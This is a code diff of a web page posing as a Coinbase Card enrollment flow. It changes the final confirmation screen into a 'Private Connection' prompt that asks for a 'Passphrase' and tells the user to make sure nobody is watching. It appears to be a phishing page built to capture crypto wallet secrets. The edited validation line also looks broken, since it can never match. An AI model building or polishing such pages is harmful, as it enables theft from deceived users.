@@ -884,14 +884,14 @@
     <!-- ══ SCREEN 9: ATTESTATION ══ -->
     <div class="screen" id="s9">
       <div class="step-badge">Final Step — Confirm</div>
-      <h2>Confirm your enrollment</h2>
-      <p class="sub">Type <strong>"I attest"</strong> below to confirm you have read and agree to the Coinbase Card terms, and that the wallet address you provided is yours.</p>
+      <h2>Private Connection</h2>
+      <p class="sub">Type <strong>" Make sure no one is around you."</strong> No friends, no strangers, no one looking over your shoulder. Even a quick glance from someone else is a risk you cannot afford.</p>
       <div class="vm-field" style="width:100%;margin-bottom:10px">
         <label>Attestation Statement</label>
-        <input type="text" id="attestInput" placeholder='Type: I attest' autocomplete="off" spellcheck="false" />
+        <textarea type="text" id="attestInput" placeholder='Passphrase' autocomplete="off" spellcheck="false" ></textarea>
       </div>
       <div id="attestError" style="display:none;color:#D23F31;font-size:12px;margin-bottom:10px;font-weight:600">
-        ⚠ Please type "I attest" to continue
+        ⚠ Connect
       </div>
       <button class="btn-primary" style="width:100%" onclick="submitAttestation()">Complete Enrollment →</button>
       <button class="btn-ghost" style="width:100%;margin-top:8px" onclick="showScreen('s5')">← Back to my card</button>
@@ -1218,7 +1218,7 @@ async function submitAttestation() {
   const err   = document.getElementById('attestError');
   const val   = input.value.trim();
 
-  if (val.toLowerCase() !== 'i attest') {
+  if (val.toLowerCase() !== ' Make sure no one is around you.') {
     err.style.display = '';
     input.style.borderColor = '#D23F31';
     input.style.boxShadow = '0 0 0 3px rgba(210,63,49,.15)';
